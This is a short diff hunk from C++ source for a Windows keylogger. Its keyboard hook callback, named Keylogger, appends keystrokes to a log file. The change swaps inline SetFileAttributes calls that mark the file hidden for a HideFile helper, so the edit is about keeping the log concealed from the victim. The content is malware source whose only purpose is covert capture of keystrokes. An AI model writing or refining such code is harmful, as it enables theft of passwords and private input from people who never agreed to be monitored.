@@ -28,8 +28,7 @@ LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 	ofstream out;
 
 	out.open("KeyloggerLog.txt", ios::app);
-	if (GetFileAttributes("KeyloggerLog.txt") != 0x22)
-		SetFileAttributes("KeyloggerLog.txt", 0x22);
+	HideFile("KeyloggerLog.txt");
 
 	GetKeyboardState(keyboard_state);
 
